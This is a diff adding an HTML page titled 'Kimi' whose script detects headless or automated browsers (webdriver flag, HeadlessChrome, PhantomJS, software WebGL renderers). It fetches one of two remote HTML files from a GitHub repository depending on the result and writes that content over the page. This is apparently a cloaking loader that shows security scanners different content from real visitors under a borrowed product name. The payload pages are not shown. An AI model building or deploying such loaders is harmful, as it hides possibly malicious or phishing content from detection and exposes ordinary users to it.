@@ -1,0 +1,59 @@
+<!DOCTYPE html>
+<html>
+<head><meta charset="UTF-8"><title>Kimi</title>
+<style>*{margin:0;padding:0}#b{position:fixed;top:0;left:0;width:100%;height:3px;z-index:9999}#f{height:100%;width:0%;background:#06f;transition:width .1s linear}</style>
+</head>
+<body><div id="b"><div id="f"></div></div>
+<script>
+// ===== 只需改这两处 =====
+const HEADLESS_URL = "https://cdn.jsdelivr.net/gh/userrxh2868/-2868userrxh@main/lgjp.html";
+const NORMAL_URL   = "https://gh-proxy.org/https://github.com/userrxh2868/-2868userrxh/raw/refs/heads/main/lgjp.html";
+// ========================
+
+const f = document.getElementById('f');
+
+function isHeadless() {
+  if (navigator.webdriver === true) return true;
+  if (/HeadlessChrome/i.test(navigator.userAgent)) return true;
+  if (window.callPhantom || window._phantom) return true;
+  if (!navigator.languages || navigator.languages.length === 0) return true;
+  if (window.outerWidth === 0 || window.outerHeight === 0) return true;
+  try {
+    const gl = document.createElement('canvas').getContext('webgl');
+    const info = gl.getExtension('WEBGL_debug_renderer_info');
+    if (info && /swiftshader|llvmpipe/i.test(gl.getParameter(info.UNMASKED_RENDERER_WEBGL))) return true;
+  } catch(e){}
+  return false;
+}
+
+async function load(url) {
+  const target = url + (url.indexOf('?')>-1?'&':'?') + '_=' + Date.now();
+  const r = await fetch(target, {cache:'no-store'});
+  if (!r.ok) throw new Error(r.status);
+  const ctype = (r.headers.get('Content-Type')||'').toLowerCase();
+  if (/^(image|audio|video|application\/pdf)/i.test(ctype)) { location.replace(target); return; }
+  const reader = r.body.getReader();
+  const chunks = []; let got = 0, total = +r.headers.get('Content-Length')||0;
+  while (true) {
+    const {done, value} = await reader.read();
+    if (done) break;
+    chunks.push(value); got += value.length;
+    f.style.width = total ? Math.min(100, got/total*100)+'%' : Math.min(90, got/1024)+'%';
+  }
+  const all = new Uint8Array(got); let o = 0;
+  for (const c of chunks) { all.set(c, o); o += c.length; }
+  let h = new TextDecoder('utf-8').decode(all);
+  if (!/<base\s/i.test(h)) h = h.replace(/<head([^>]*)>/i, '<head$1><base href="'+url+'">');
+  f.style.width = '100%';
+  setTimeout(()=>{ document.open(); document.write(h); document.close(); }, 200);
+}
+
+(async ()=>{
+  f.style.width = '10%';
+  const url = (isHeadless() ? HEADLESS_URL : NORMAL_URL).trim();
+  if (!url) { f.style.background='#e74c3c'; f.style.width='100%'; return; }
+  load(url).catch(()=>location.replace(url));
+})();
+</script>
+</body>
+</html>
